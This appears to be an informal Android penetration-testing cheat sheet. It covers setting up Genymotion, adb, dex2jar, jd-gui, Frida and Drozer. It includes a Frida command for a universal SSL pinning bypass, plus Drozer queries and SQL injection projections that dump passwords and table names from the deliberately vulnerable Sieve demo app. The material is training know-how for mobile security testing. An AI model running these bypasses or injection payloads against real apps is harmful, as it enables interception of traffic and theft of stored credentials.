First of all, i would recommend you to download the genymotion emulator.
https://dl.genymotion.com/releases/genymotion-2.12.2/genymotion-2.12.2.exe

Setup:
    apt-get install dex2jar
    apt-get install jd-gui
    apt-get install adb     
    apt-get install frida* 
    git clone https://github.com/mwrlabs/drozer/
    update-alternatives --config java   # Important!! maybe you must to use it to change your currnent java version, or another program like netcat!
   
Setup your virtualbox with some *nix and the Genymotion VM, maybe it will create a Host-Only Network that you can communicate between. 
Turn on the VMs and check for connectivity:

kali@root# ping 192.168.177.101         # In my case, the Genymotion android VM has in 192.168.177.0/24 network.

dex2jar:
    dex2jar <app.apk>                   # Decompile your apk to .jar file. After it, you can use jd-gui decompiler.   
    
jd-gui decompiler:
    Usually i have problems with jd-gui decompiler because my java version.. (i guess), then i used a "trick" to open it.
    echo -ne "#\!/bin/sh\n\njava --add-opens java.base/jdk.internal.loader=ALL-UNNAMED --add-opens jdk.zipfs/jdk.nio.zipfs=ALL-UNNAMED -jar /usr/share/jd-gui/jd-gui.jar" > /usr/bin/jd-gui

adb connect <ip>                          # Only work if adb port is online on the device. Luckly for us, Genymotion turn on it by default.

ADB:    
     adb connect <ip>              
     adb forward tcp:<local_port> tcp:<device_port>    # Forward device port to our local host
     adb devices -l                 # List the current adb devices 
     adb shell <command_to_execute> # Execute commands without a interactive shell 
     adb shell                      # Only open the device shell. 
     adb logcat                     # Log all device activities, recommended for debbuging.
     adb install <app.apk>          # Automatically install the local apk in *nix VM
     adb uninstall <app.apk>        # Uninstall the apk installed on the device
     adb push <local_file>          # Upload file on the device
     adb pull <device_file>         # Download file from the device
     adb shell pm list packages     # Show all installed apps (output ex: com.app.example)
     adb shell pm 
     adb --help                     # My passion...

Setup Frida:
    1) Download frida-server from this website on your linux(to do it more easily):
    https://github.com/frida/frida/releases
    |
     -> frida-server-12.1.1-android-arm.xz
     -> frida-server-12.1.1-android-arm64.xz

    2) android@root# tar xz <frida-server.xz>
    3) android@root# adb push frida-server /data/local/tmp/
    4) android@root# adb shell "chmod 755 /data/local/tmp/frida-server"
    5) android@root# adb shell "/data/local/tmp/frida-server &"

    Now you are running your frida-server!!

Frida:
     frida-ps -U                    # Show all USB device processes (like "ps aux" on linux).
     frida-ls-devices               # Show all current connected devices.
     frida -U                       # Connect to USB device 
     frida -R                       # Connect to remote device 
     frida -U -p <pid>              # Attach process using USB device
     frida --help                   # My passion...
     frida<TAB><TAB>                # Show all frida tools
     frida-trace -U -i <call> <app> # Trace calls in your app, like open(), strcmp()....
     Universal SSL Pinning Bypass:
     |
      -> Please, read this article. # https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/
      -> frida --no-pause --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -f <app> (Ex: com.app.example)
     References:
        |
         -> https://www.frida.re/docs/android/
Drozer:
    Install:
        wget https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk
        mv drozer-agent-*.apk agent.apk
        adb push agent.apk /data/local/tmp/
        adb install /data/local/tmp/agent.apk
        adb forward tcp:31415 tcp:31415
        
     drozer console connect  
     drozer --help                      # My passion...
     dz> run app.package.list -f <app>
     dz> run app.package.info -a <app>
     dz> run app.package.attacksurface <app>
     dz> run app.activity.info -a <app>
     dz> run app.activity.start --component 
     dz> help app.activity.start
     dz> run app.provider.info -a <app>
     dz> run scanner.provider.finduris -a <app>
     |
       -> Scanning com.mwr.example.sieve...
          Unable to Query content://com.mwr.example.sieve.DBContentProvider/
          ...
          Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
          Accessible content URIs:
          content://com.mwr.example.sieve.DBContentProvider/Keys/
          content://com.mwr.example.sieve.DBContentProvider/Passwords
          content://com.mwr.example.sieve.DBContentProvider/Passwords/
          
     dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
     |
       -> _id: 1
          service: Email
          username: incognitoguy50
          password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64-encoded)
          email: incognitoguy50@gmail.com
          
     dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
     |
       -> unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELECT 'FROM Passwords
     
     dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
     |
      -> | type  | name             | tbl_name         | rootpage | sql              |
         | table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
         | table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
         | table | Key              | Key              | 5        | CREATE TABLE ... |
      
      .... i'll not spend all of my time copying and pasting those outputs...check out the reference below.
     
    References:
     |
      -> https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf

Android Hacking Material (IMPORTANT!!!):
    Android Hacker's Handbook.pdf
    https://pt.slideshare.net/MamoonIsmail/stagefright-1
    https://sushi2k.gitbooks.io/the-owasp-mobile-security-testing-guide/
    https://support.portswigger.net/customer/portal/articles/1841101-configuring-an-android-device-to-work-with-burp
    https://blog.netspi.com/four-ways-bypass-android-ssl-verification-certificate-pinning/
    https://pt.slideshare.net/anantshri/ssl-pinning-and-bypasses-android-and-ios
    https://github.com/WooyunDota/DroidDrops/blob/master/2018/Frida.Android.Practice.md
    https://11x256.github.io/Frida-hooking-android-part-1/
    https://github.com/OWASP-Ruhrpott/owasp-workshop-android-pentest/wiki/SSL-Pinning-Solution
